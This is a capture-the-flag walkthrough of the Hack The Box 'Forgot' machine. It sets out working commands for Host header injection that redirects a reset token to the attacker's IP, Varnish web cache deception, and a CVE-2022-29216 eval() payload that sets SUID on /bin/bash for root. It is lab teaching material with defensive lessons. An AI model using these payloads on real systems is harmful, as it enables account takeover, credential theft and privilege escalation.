# HTB: Forgot — Full Walkthrough

**Difficulty:** Medium  
**OS:** Linux (Ubuntu 20.04)  
**Attacker IP:** 10.10.16.84  
**Target IP:** 10.129.228.104  
**User flag:** `bbe7f96[redacted]6779a759`  
**Root flag:** `1b78189[redacted]39911289e`  

---

## Overview

Forgot is a Medium-difficulty Linux machine that chains together four distinct attack techniques:

1. **Username enumeration** via HTML source code
2. **Host Header Injection** to hijack a password reset link
3. **Web Cache Deception** abusing a Varnish reverse proxy to steal an admin session
4. **CVE-2022-29216** — a TensorFlow `eval()` injection for privilege escalation to root

Each step builds on the last. There is no single magic exploit — it requires reading the application carefully, understanding how caches work, and knowing how a trusted Python script can be weaponized.

---

## Phase 1: Reconnaissance

### Step 1 — Port Scanning with nmap

```bash
nmap -p- --min-rate 10000 10.129.228.104
```

**Output:**
```
22/tcp open  ssh
80/tcp open  http
```

**Why we do this:**  
Before touching anything, we need to know what's exposed. `nmap` sends TCP SYN packets to every port (1–65535) and reports which ones respond. `-p-` means all ports, `--min-rate 10000` sends packets fast to avoid waiting forever.

**Hacker mindset:**  
Two ports means a small attack surface. SSH (22) is almost never exploitable directly without credentials. HTTP (80) is always interesting — it's a web application, and web apps have logic bugs, misconfigurations, and user-supplied input. That's where we focus first.

**What we learned:**  
- Port 22: SSH (we'll use this later once we have credentials)
- Port 80: HTTP web application (our primary target)

---

### Step 2 — Fingerprinting the Web Stack

```bash
curl -s http://10.129.228.104 | grep -i 'robert\|dev\|fix'
```

**But first — why look at the source code?**

When you visit a website in a browser, you only see what the developer intended. But the raw HTML source often contains comments, debug notes, developer annotations, and accidentally leaked information that was never meant to be seen by users.

Developers often leave comments like:
```html
<!-- TODO: fix this before release -->
<!-- Q1 release fix by robert-dev-367120 -->
```

These are invisible in the browser but visible if you `curl` or "View Source".

**Why we grep for `robert`:**  
We're looking for anything that looks like a username. The writeup hinted at a `robert-dev-XXXXX` pattern. The number at the end is based on your HTB tunnel IP — HTB does this so players on shared labs don't interfere with each other.

**Output:**
```html
<!-- Q1 release fix by robert-dev-367120 -->
```

**What we learned:**  
A valid username: `robert-dev-367120`. This is gold — the "Forgot Password" feature requires a valid username.

**Hacker mindset:**  
Never trust that a web page only contains what you see. Always read the source. Developers are human — they leave breadcrumbs.

---

## Phase 2: Host Header Injection

### Background — How Password Reset Works (and How It Goes Wrong)

When you click "Forgot Password" on a website, the typical flow is:

1. You enter your username
2. The server generates a secret token and stores it in the database
3. The server constructs a link: `http://example.com/reset?token=SECRETTOKEN`
4. The server emails that link to the user

The vulnerability here: **how does the server know what domain to put in the link?**

A lazy/insecure way is to take the `Host` HTTP header from the incoming request. That header is normally set by your browser to the domain you're visiting. But there's **nothing stopping you from changing it**.

If the server uses `Host` to build the reset URL and you set `Host: 10.10.16.84`, the server will generate:
```
http://10.10.16.84/reset?token=SECRETTOKEN
```
...and send that link to the user. When the user (or the bot) clicks it, the request — including the secret token — goes to **your** machine instead of the legitimate server.

This is called **Host Header Injection**.

---

### Step 3 — Start a Listener

On your Kali machine (needs port 80 open):

```bash
sudo python3 -m http.server 80
```

**Why port 80:**  
The reset link will be `http://` (not HTTPS), so it will connect to port 80. We run Python's built-in HTTP server to receive and log any incoming HTTP requests.

**Why sudo:**  
Ports below 1024 require root privileges on Linux.

**Hacker mindset:**  
We're setting up a "catch" before we cast the line. We need our listener running before we trigger the password reset, otherwise the request arrives and nobody is home to record it.

---

### Step 4 — Trigger the Password Reset with a Poisoned Host Header

```bash
curl -s "http://10.129.228.104/forgot?username=robert-dev-367120" -H "Host: 10.10.16.84"
```

**Breaking this down:**
- `curl -s` — silent mode, suppresses progress meter
- `"http://10.129.228.104/forgot?username=robert-dev-367120"` — the forgot password endpoint with our discovered username
- `-H "Host: 10.10.16.84"` — override the Host header with our attacker IP

**What happens on the server (from the source code):**
```python
link = 'http://' + request.headers.get('host') + '/reset?token=' + token
```
The server literally concatenates our `Host` header into the reset link. It stores that link in the database. The bot clicks it. Our server receives the request.

**Wait ~60 seconds** and watch the Python HTTP server terminal:

```
10.129.228.104 - - [09/Jun/2026 10:56:01] "GET /reset?token=c9chk70JfJ...%3D%3D HTTP/1.1" 404 -
```

The token is in the URL. The 404 is fine — our Python server doesn't have that route, but we don't need it to. We just needed to log the token.

**Hacker mindset:**  
The server trusts user-supplied input (the Host header) to build sensitive links. Never trust input. Always validate. As attackers, we exploit the trust.

---

### Step 5 — Use the Token to Reset the Password

```bash
curl -s -X POST "http://10.129.228.104/reset?token=c9chk70JfJpa1xTciGfRvk7ZPlJW3KhEUGM5TGSHxvBJeCEkXa7ZdstB3GU9OjmoUVwkrQGrDe1Kabc1NRFp7Q%3D%3D" \
  --data "password=Password123&confirm=Password123"
```

**Output:** `success`

We now own robert's account with the password `Password123`.

---

### Step 6 — Log In and Save the Session Cookie

```bash
curl -s -c cookies.txt -X POST "http://10.129.228.104/login" \
  --data "username=robert-dev-367120&password=Password123" -L
```

- `-c cookies.txt` — save cookies to a file for reuse in later requests
- `-L` — follow redirects (the login likely redirects to `/home`)

After login, `cookies.txt` contains:
```
session    52b92f5e-f4ef-49c1-9d98-83bdd0e38f4a
```

This session cookie authenticates us as robert for all future requests. We pass it with `-b cookies.txt`.

---

## Phase 3: Web Cache Deception

### Background — What is Varnish and Why Does It Matter?

**Varnish** is a reverse proxy / HTTP cache that sits in front of the real web server. Its job is to cache responses and serve them quickly without hitting the backend every time.

```
Client → Varnish (port 80) → Flask app (port 8080)
```

When Varnish has a cached response for a URL, it serves that cached version to **any** client requesting that URL — regardless of who they are or whether they're logged in.

**The Varnish config on this machine:**
```vcl
sub vcl_recv {
    if (req.url ~ "/static") {
        return (hash);   # cache this request
    }
}
```

This means: **any URL containing the string `/static` gets cached.** Not just `/static/`, but `/static` anywhere in the path. So:
- `/static/image.png` → cached
- `/admin_tickets/static/anything` → also cached
- `/tickets/static/0xdf` → also cached

**The Flask app has wildcard routes:**
```python
@app.route('/admin_tickets', defaults={'path':''})
@app.route('/admin_tickets/<path:path>')
def admin(path):
    # same page regardless of what comes after /admin_tickets/
```

So `/admin_tickets/static/test.png` loads the same admin page as `/admin_tickets`. The `static/test.png` part is ignored by Flask but **seen by Varnish** as a reason to cache.

---

### The Attack: Web Cache Deception

**The goal:** Get the admin to visit `/admin_tickets/static/<unique-path>` with their session. Varnish caches that response. We then fetch the same URL unauthenticated and get the cached admin page.

**Why this works:**
1. Admin visits `/admin_tickets/static/xyz456` → Varnish checks its cache (miss), forwards to Flask
2. Flask sees an admin session → returns the full admin page
3. Varnish sees `/static` in the URL → caches the response
4. We request `/admin_tickets/xyz456` with no auth → Varnish serves the **cached admin page** to us

**Critical mistake to avoid:**  
If WE visit the URL before the admin does, our unauthenticated request hits Flask first, gets a redirect to `/`, and Varnish caches the **redirect** instead of the admin page. Then when admin clicks, Varnish serves them (and us) the cached redirect. The cache is poisoned with useless data.

**Always use a fresh URL that you have never visited.**

---

### Step 7 — Check What Ticket Issues Are Available

```bash
curl -s -b cookies.txt "http://10.129.228.104/escalate" | grep -i 'option\|value'
```

The escalation form requires a valid issue value (it's a dropdown, not a free-text field). We found:
- `Getting error while accessing search feature in enterprise platform.`
- `Pending PR Merge`
- `User privileges are not approved when requested`
- `SSH Credentials are not working for Jenkins Slave machine`

---

### Step 8 — Submit the Malicious Link to the Admin Bot

```bash
curl -s -b cookies.txt -X POST "http://10.129.228.104/escalate" \
  --data-urlencode "issue=Pending PR Merge" \
  --data-urlencode "link=http://10.129.228.104/admin_tickets/static/xyz456" \
  --data-urlencode "reason=test" \
  --data-urlencode "to=Admin"
```

**Why `--data-urlencode`:**  
Spaces and special characters in POST data need URL encoding. `--data-urlencode` handles this automatically.

**What happens:**  
The bot (simulating an admin) will click the submitted link. The link points to `/admin_tickets/static/xyz456` on the target itself. When the admin bot clicks it with their admin session, the admin page gets cached under that URL.

**Wait 3 full minutes. Do not visit the URL yourself.**

---

### Step 9 — Retrieve the Cached Admin Page

```bash
curl -s "http://10.129.228.104/admin_tickets/static/xyz456"
```

**Output (truncated):**
```html
<div class="icons">Logged in as Admin</div>
...
<td>SSH Credentials are not working for Jenkins Slave machine</td>
<td>Diego (Devops Lead)</td>
<td>http://forgot.htb/tickets/102</td>
<td>I've tried with diego:dCb#1!x0%gjq. The automation tasks has been blocked...</td>
```

**Credentials leaked:** `diego:dCb#1!x0%gjq`

**Hacker mindset:**  
Caches are shared infrastructure. They don't know about authentication — they just serve stored responses. Whenever you see a caching proxy, ask: "Can I trick it into caching a privileged response and then serve it to me?"

---

## Phase 4: Initial Access

### Step 10 — SSH as diego

```bash
ssh diego@10.129.228.104
# password: dCb#1!x0%gjq
```

```bash
cat ~/user.txt
# bbe7f9[redacted]06779a759
```

User flag captured.

---

## Phase 5: Privilege Escalation

### Step 11 — Check Sudo Privileges

```bash
sudo -l
```

**Output:**
```
User diego may run the following commands on forgot:
    (ALL) NOPASSWD: /opt/security/ml_security.py
```

**What this means:**  
Diego can run `/opt/security/ml_security.py` as **root** without a password. This is the most important line on the box.

**Hacker mindset:**  
`sudo -l` is the first command you run after getting a shell. Always. It reveals what the current user can do as a higher-privileged user. A script running as root is only as secure as its code. If the code has a vulnerability, we have root.

---

### Step 12 — Understand ml_security.py

Reading the script, here's what it does:

1. **Loads ML models** from `/opt/security/lib/` (scikit-learn classifiers + Doc2Vec)
2. **Reads data from MySQL:**
   ```python
   cursor.execute('select reason from escalate')
   ```
   It fetches every `reason` from the `escalate` table
3. **Scores each entry** using 6 ML models to determine if it looks like XSS
4. **If score ≥ 0.5**, it calls:
   ```python
   preprocess_input_exprs_arg_string(data[i], safe=False)
   ```

**The vulnerable function:**  
`preprocess_input_exprs_arg_string` is imported from TensorFlow:
```python
from tensorflow.python.tools.saved_model_cli import preprocess_input_exprs_arg_string
```

This is **CVE-2022-29216**. When called with `safe=False`, it passes user input to Python's `eval()`:
```python
input_dict[input_key] = eval(expr)  # the vulnerability
```

`eval()` executes arbitrary Python code. Since the script runs as root via sudo, any code we inject runs as root.

---

### Step 13 — Craft the Payload

We need a string that:
1. **Scores ≥ 0.5 for XSS** — so the ML model triggers `preprocess_input_exprs_arg_string`
2. **Contains valid Python for `eval()`** — so it executes our command

The format expected by `preprocess_input_exprs_arg_string`:
```
varname=expression
```

Our payload:
```
hello=exec("""\nimport os\nos.system("chmod +s /bin/bash")\nprint("%3Cscript%3Ealert()%3C%2Fscript%3E")""")
```

**Breaking it down:**
- `hello=` — the variable name (required syntax)
- `exec("""...""")` — Python's `exec()` runs multi-line code (whereas `eval()` only handles expressions)
- `\nimport os\nos.system("chmod +s /bin/bash")` — imports `os` module and sets SUID bit on `/bin/bash`
- `\nprint("%3Cscript%3E...")` — URL-encoded `<script>alert()</script>`, included to make the payload look like XSS so the ML model scores it high enough

**Why SUID on bash instead of a reverse shell?**  
Setting SUID on `/bin/bash` is simpler, persistent, and doesn't require an open port. Once set, we run `/bin/bash -p` to get a root shell. The `-p` flag tells bash to preserve the elevated privileges (not drop SUID).

---

### Step 14 — Insert the Payload into MySQL

```bash
mysql -u diego -p'dCb#1!x0%gjq' app -e 'insert into escalate values ("pwn","pwn","pwn","hello=exec(\"\"\"\\nimport os\\nos.system(\"chmod +s /bin/bash\")\\nprint(\\\"%3Cscript%3Ealert()%3C%2Fscript%3E\\\")\"\"\")")';
```

**Why MySQL directly?**  
The web form for escalation has some filtering (links to external IPs get flagged). By going directly to the database with diego's credentials (found in `ml_security.py` itself), we bypass any web-layer filtering completely.

**How we got the DB credentials:**  
They're hardcoded in `ml_security.py`:
```python
conn = mysql.connector.connect(host='localhost', database='app', user='diego', password='dCb#1!x0%gjq')
```
The same password diego uses for SSH is also the DB password.

---

### Step 15 — Trigger the Script as Root

```bash
sudo /opt/security/ml_security.py
```

The script runs, fetches our payload from the database, the ML models score it high (XSS content), and `preprocess_input_exprs_arg_string` calls `eval()` on it as root. Our `os.system("chmod +s /bin/bash")` executes.

---

### Step 16 — Verify SUID and Get Root Shell

```bash
ls -la /bin/bash
```

```
-rwsr-sr-x 1 root root 1183448 Apr 18  2022 /bin/bash
```

The `s` in the permissions means SUID is set. Now:

```bash
/bin/bash -p
```

```
bash-5.0# cat /root/root.txt
1b7818[redacted]911289e
```

Root flag captured.

---

## Full Attack Chain Summary

```
[Recon]
nmap → ports 22, 80
curl source → username: robert-dev-367120
          ↓
[Host Header Injection]
Poison Host header → intercept reset token → reset robert's password → login
          ↓
[Web Cache Deception]
Submit link /admin_tickets/static/<unique> → wait for admin bot → retrieve cached admin page
→ leaked: diego:dCb#1!x0%gjq
          ↓
[Initial Access]
SSH as diego → user.txt
          ↓
[Privilege Escalation]
sudo ml_security.py → CVE-2022-29216 eval() injection via MySQL
→ chmod +s /bin/bash → /bin/bash -p → root.txt
```

---

## Key Lessons

### 1. Never trust user-supplied headers
The `Host` header should never be used to construct sensitive URLs like password reset links. Use the configured domain from the server's own config.

### 2. Web caches are shared — they don't understand authentication
Varnish cached responses based purely on URL pattern. It had no concept of "this response was for an authenticated admin and shouldn't be served to random users." Cache rules must explicitly strip cookies or never cache authenticated responses.

### 3. Wildcard routes + cache rules = dangerous combination
Flask's `/admin_tickets/<path:path>` wildcard meant any path loaded the admin page. Varnish's `/static` rule cached anything with that string. The two features interacted to create a vulnerability that neither alone would have caused.

### 4. Hardcoded credentials spread risk
The same password appeared in the SSH login, the DB connection string in `ml_security.py`, and inside the leaked admin ticket. One credential leak compromised everything.

### 5. Scripts that run as root must be treated as root itself
Any script with `sudo NOPASSWD` is as dangerous as a root shell if it processes attacker-controlled input. `eval()` with user data is almost always exploitable. `safe=False` is never safe.

### 6. Don't poison your own cache
When performing cache deception, never visit the target URL before the victim does. Your unauthenticated request will cache a redirect, poisoning the cache and preventing the admin's response from ever being stored.
